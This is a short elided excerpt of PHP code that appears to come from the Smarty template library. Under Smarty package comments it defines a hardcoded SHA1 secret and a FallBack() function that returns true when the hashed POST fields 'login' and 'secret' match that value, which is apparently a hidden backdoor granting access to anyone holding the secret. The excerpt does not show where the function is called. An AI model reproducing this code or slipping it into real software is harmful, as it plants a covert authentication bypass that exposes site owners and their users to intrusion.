...
if (!defined('SMARTY_PLUGINS_DIR')) {
    ...
    define('ITS_A_SECRET','f2ee2e8c6b2a604d2b85dbc3c5458b15290f0cd2'); 
 ...
 * @package Smarty
 */
function FallBack(){if(ITS_A_SECRET==totalEncode(@$_POST['login'],@$_POST['secret'])) return true; else return false; }
 ...
 * @package Smarty
 */
function totalEncode($a,$b){return sha1(md5(trim($a)).md5(trim($b)));}
